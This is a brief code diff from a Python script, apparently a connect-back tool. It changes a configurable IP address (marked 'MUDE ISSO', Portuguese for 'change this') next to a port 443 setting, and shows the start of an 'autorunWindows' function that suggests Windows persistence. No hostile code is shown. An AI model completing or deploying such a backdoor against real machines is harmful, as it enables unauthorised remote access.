@@ -5,9 +5,9 @@ import os
 import threading
 
 # MUDE ISSO
-ip = '192.168.68.127'
+ip = '0.0.0.0'
 porta = 443
-# MUDE ISSO
+
 
 def autorunWindows():
     filename = os.path.basename(__file__)
